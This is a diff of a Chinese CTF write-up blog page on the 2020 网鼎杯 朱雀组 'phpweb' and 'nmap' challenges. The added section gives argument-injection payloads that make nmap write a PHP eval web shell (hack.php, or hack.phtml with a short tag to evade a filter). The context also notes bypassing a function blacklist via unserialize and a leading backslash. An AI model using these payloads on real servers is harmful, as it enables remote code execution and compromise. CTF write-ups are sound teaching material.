@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>[网鼎杯 2020 朱雀组]phpweb | 过客</title>
+  <title>[网鼎杯 2020 朱雀组]phpweb/nmap | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[网鼎杯 2020 朱雀组]phpweb | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[网鼎杯 2020 朱雀组]phpweb/nmap | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,7 +25,7 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="[网鼎杯 2020 朱雀组]phpweb"/>
+    <meta property="og:description" content="[网鼎杯 2020 朱雀组]phpweb/nmap"/>
     <meta property="og:url" content="https://guokeya.github.io/post/Hb42X2pY3/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
@@ -81,7 +81,7 @@
           	<span class="tags">
           	 
         </span>
-            <h1>[网鼎杯 2020 朱雀组]phpweb</h1>
+            <h1>[网鼎杯 2020 朱雀组]phpweb/nmap</h1>
             <span class="meta">
             	Posted on
               2020-05-17，2 min read
@@ -172,6 +172,14 @@ gettime可以忽略。就是个回调函数<br>
 他只对func进行了判断。那么我们可以通过unserialize进行反序列化。二次执行<br>
 <img src="https://guokeya.github.io/post-images/1589721294910.png" alt="" loading="lazy"><br>
 还有就是可以通过\绕过，。\system即可绕过system的限制。</p>
+<p>nmap<br>
+这题和buuctf Online Tools一样。<br>
+只不过他限制了php</p>
+<pre><code>' &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php '
+</code></pre>
+<p>可以将php。换为phtml。并且用短标签</p>
+<pre><code>' &lt;? @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml '
+</code></pre>
 
           
           <p class="next-post">下一篇：
